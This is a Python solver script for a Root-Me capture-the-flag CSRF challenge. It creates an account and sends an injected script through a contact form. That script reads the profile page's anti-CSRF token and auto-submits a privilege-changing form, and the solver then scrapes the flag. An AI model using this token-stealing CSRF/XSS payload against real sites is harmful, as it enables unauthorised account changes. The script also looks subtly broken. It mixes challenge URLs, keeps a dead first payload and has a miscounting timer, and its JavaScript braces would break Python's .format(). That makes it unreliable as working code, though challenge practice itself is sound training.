#!/usr/bin/python
import os
import sys
import re
from time import sleep

base = "http://challenge01.root-me.org/web-client/ch22/"
user = "plop"

print("Step 1: create a user")
action = base + "?action=register"

s = os.popen("curl -s {act} -d 'username={usr}&password=a' -c cookie.txt -b cookie.txt".format(act=action,usr=user)).read()

print("Step 2: login as created user")
action = base + "?action=login"
os.system("curl -s {act} -d 'username={usr}&password=a' -c cookie.txt -b cookie.txt".format(act=action,usr=user))

print("Step 3: Send payload")
action = base + "?action=contact"
payload = '<form action="{act}" method="post" name="csrf"><input type="hidden" name="username" value="{usr}"/><input type="checkbox" name="status" checked="on"/></form><script>document.csrf.submit()</script>'.format(act=base+'?action=profile', usr=user)
payload="<script>function get(url) {var xmlHttp = new XMLHttpRequest();xmlHttp.open(\"GET\", url, false);xmlHttp.send(null);return xmlHttp.responseText;} var csrfProtectedPage = 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile';var csrfProtectedForm = 'profile';var html = get(csrfProtectedPage);document.body.innerHTML = html;var form = document.getElementById(csrfProtectedForm); var token = form.token.value;document.body.innerHTML += '<form id=\"myform\" action=\"' + csrfProtectedPage + '\" method=\"POST\"><input id=\"status\" name=\"status\" checked=\"on\" type=\"checkbox\"><input id=\"token\" type=\"hidden\" name=\"token\" value=\"' + token + '\"><input id=\"username\" name=\"username\" value=\"{usr}\"></form>';document.forms[\"myform\"].submit();</script>".format(usr=user)


os.system("curl -s '{act}' --data-urlencode 'email=a@a.a&content={pld}' -b cookie.txt".format(act=action, pld=payload))

print("Step 4: Wait a little while")
i = 0
while i < 10:
	sleep(1)
	sys.stdout.write('{0}\r'.format(5-i))
	sys.stdout.flush()
	i += 1
print()

print("Step 5: Get the flag")
action = base + '?action=private'
flagPage = os.popen("curl -s '{act}' -b cookie.txt".format(act=action)).read()
m = re.match("(.*\n)*.*flag is : (.*)",flagPage)
print(m.group(2))

